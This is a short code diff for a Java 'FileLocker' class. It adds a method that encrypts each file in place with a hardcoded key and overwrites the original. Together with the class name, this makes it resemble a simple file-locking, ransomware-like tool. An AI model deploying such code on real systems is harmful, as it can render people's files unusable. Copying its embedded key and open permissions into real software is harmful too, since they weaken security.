@@ -7,6 +7,11 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.nio.file.attribute.PosixFilePermissions;
 
+import org.apache.commons.io.IOUtils;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+
 
 public class FileLocker {
     final static String ALL_ACCESS="rwxrwxrwx";
@@ -40,9 +45,26 @@ public class FileLocker {
             }
         }
         else {
-            Crypto.fileProcessor(cipherMode, "R9YRrBx6nuoY0Rp3qn5e7gg79UFHUtMT", file.getPath());
+            fileProcessor(cipherMode, "R9YRrBx6nuoY0Rp3qn5e7gg79UFHUtMT", file.getPath());
         }
     }
 
+    private static void fileProcessor(int cipherMode,String key,String path) {
+        try {
+            File file = new File(path);
+            FileInputStream inputStream = new FileInputStream(file);
+            byte[] inputBytes = IOUtils.toByteArray(inputStream);
+            byte[] outputBytes = Encryption.encrypt(cipherMode, key, inputBytes);
+
+            FileOutputStream outputStream = new FileOutputStream(file);
+            outputStream.write(outputBytes);
+
+            inputStream.close();
+            outputStream.close();
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
 }
